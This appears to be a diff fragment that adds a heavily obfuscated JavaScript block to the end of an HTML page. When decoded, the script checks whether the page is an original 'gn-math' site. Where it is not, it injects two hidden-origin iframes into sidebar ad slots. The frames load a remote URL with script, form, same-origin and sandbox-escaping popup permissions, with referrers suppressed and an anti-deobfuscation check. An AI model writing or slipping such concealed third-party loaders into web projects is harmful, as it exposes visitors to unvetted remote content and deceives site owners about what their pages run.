+<script>(function(_0x50f0a0,_0x3458d9){const _0x4fb9dc={_0x2d4f05:0xc9,_0x298842:0xb4,_0x48742d:0xcd,_0x2163ff:0xb8},_0x3c7ea7=_0x4329,_0x5fc080=_0x50f0a0();while(!![]){try{const _0x20c44b=parseInt(_0x3c7ea7(0xc2))/(-0x1*-0x1500+0x2*-0xf98+0xa31*0x1)+-parseInt(_0x3c7ea7(_0x4fb9dc._0x2d4f05))/(-0x1198+0x1*0xb25+-0x675*-0x1)+parseInt(_0x3c7ea7(0xc7))/(-0xeba+-0x9*0x296+0x2603)+parseInt(_0x3c7ea7(0xb9))/(0x1ae5*-0x1+-0x1*-0xdcd+0xd1c)*(-parseInt(_0x3c7ea7(_0x4fb9dc._0x298842))/(-0xd51+0x2a4+0xab2))+parseInt(_0x3c7ea7(_0x4fb9dc._0x48742d))/(0x4cd+0x99d*0x1+-0xe64)+-parseInt(_0x3c7ea7(_0x4fb9dc._0x2163ff))/(-0x624+-0x68+0x693)*(parseInt(_0x3c7ea7(0xc4))/(0x38*-0xab+-0x1a6b+-0x3fdb*-0x1))+parseInt(_0x3c7ea7(0xc3))/(-0xb23*-0x3+0x23cd+-0x3*0x170f)*(parseInt(_0x3c7ea7(0xae))/(0x296*0x1+-0x22a3+-0x2017*-0x1));if(_0x20c44b===_0x3458d9)break;else _0x5fc080['push'](_0x5fc080['shift']());}catch(_0xd9f592){_0x5fc080['push'](_0x5fc080['shift']());}}}(_0x3223,-0x373b7+0x74f31+0x952*0xd),(function(){const _0x3bed86={_0x22d02b:0xc5,_0x32d4f5:0xd0,_0x55028c:0xa6,_0x3806be:0xa4,_0x2a581f:0xc6},_0x48301c={_0x24fff4:0xc1,_0x2d6609:0xc0,_0xc62cf:0xb7,_0x47870d:0xa5,_0x107c20:0xb5,_0x521e5b:0xbc,_0xc9d37:0xca,_0xc90599:0xb3,_0x110f68:0xcf,_0x59d3f3:0xcb,_0x3a6bfc:0xa7},_0x1fe945=_0x4329,_0x51b673=(function(){let _0x27b224=!![];return function(_0x5f435d,_0x200b44){const _0x2f879f=_0x27b224?function(){if(_0x200b44){const _0x33e10b=_0x200b44['apply'](_0x5f435d,arguments);return _0x200b44=null,_0x33e10b;}}:function(){};return _0x27b224=![],_0x2f879f;};}());try{var _0x480526=window[_0x1fe945(_0x3bed86._0x22d02b)][_0x1fe945(0xbd)][_0x1fe945(_0x3bed86._0x32d4f5)+'ement'][_0x1fe945(0xb1)+'t'];if(_0x480526[_0x1fe945(0xaf)](_0x1fe945(_0x3bed86._0x55028c)+'DW')&&_0x480526[_0x1fe945(0xaf)]('gn-math'))return;}catch(_0xc9919f){}function _0x114ac4(_0x11cca2){const _0x2bc1a4={_0x2071f9:0xba,_0x4590dc:0xcc,_0x5544da:0xbe,_0x445579:0xac,_0x34efdf:0xbe},_0x215984=_0x1fe945,_0x3b0704=_0x51b673(this,function(){const _0xd6a5d=_0x4329;return _0x3b0704[_0xd6a5d(_0x2bc1a4._0x2071f9)]()[_0xd6a5d(_0x2bc1a4._0x4590dc)](_0xd6a5d(_0x2bc1a4._0x5544da)+'+$')['toString']()[_0xd6a5d(_0x2bc1a4._0x445579)+'r'](_0x3b0704)[_0xd6a5d(0xcc)](_0xd6a5d(_0x2bc1a4._0x34efdf)+'+$');});_0x3b0704();const _0x4d84dd=document[_0x215984(0xce)+_0x215984(_0x48301c._0x24fff4)](_0x11cca2);if(!_0x4d84dd)return;const _0x1097ef=document[_0x215984(_0x48301c._0x2d6609)+'ent'](_0x215984(0xb0));_0x1097ef[_0x215984(_0x48301c._0xc62cf)]=_0x215984(0xbb)+_0x215984(_0x48301c._0x47870d),_0x1097ef['width']='160',_0x1097ef[_0x215984(0xa9)]=_0x215984(_0x48301c._0x107c20),_0x1097ef[_0x215984(0xa8)]=_0x215984(_0x48301c._0x521e5b)+_0x215984(_0x48301c._0xc9d37)+_0x215984(_0x48301c._0xc90599)+'t/e',_0x1097ef['sandbox']=_0x215984(0xab)+_0x215984(0xad)+_0x215984(0xaa)+_0x215984(0xb2)+_0x215984(_0x48301c._0x110f68)+_0x215984(_0x48301c._0x59d3f3)+'ow-popups-'+'to-escape-'+_0x215984(0xc8),_0x1097ef[_0x215984(_0x48301c._0x3a6bfc)+_0x215984(0xb6)]='no-referre'+'r',_0x4d84dd[_0x215984(0xbf)+'d'](_0x1097ef);}_0x114ac4(_0x1fe945(_0x3bed86._0x3806be)),_0x114ac4(_0x1fe945(_0x3bed86._0x2a581f));}()));function _0x4329(_0x3389c4,_0x387003){_0x3389c4=_0x3389c4-(0x13*-0xa+0x130e+0x27*-0x74);const _0x258c73=_0x3223();let _0x2d50b7=_0x258c73[_0x3389c4];return _0x2d50b7;}function _0x3223(){const _0xef3ba7=['src','height','same-origi','allow-scri','constructo','pts\x20allow-','4470sbZuwl','includes','iframe','textConten','n\x20allow-po','duplace.ne','230595VaSFDZ','600','licy','className','2135xQibeE','44LKLXzl','toString','sidebar-fr','https://br','document','(((.+)+)+)','appendChil','createElem','ById','566918Aqglyf','3699xKfnmt','13472qyPqVh','parent','sidebarad2','536319myZxZu','sandbox','283444wIUiDu','eadisgay.e','-forms\x20all','search','3102330GuehmQ','getElement','pups\x20allow','documentEl','sidebarad1','ame','G-WX5VS54Z','referrerPo'];_0x3223=function(){return _0xef3ba7;};return _0x3223();}</script>
+
 
 </body></html>
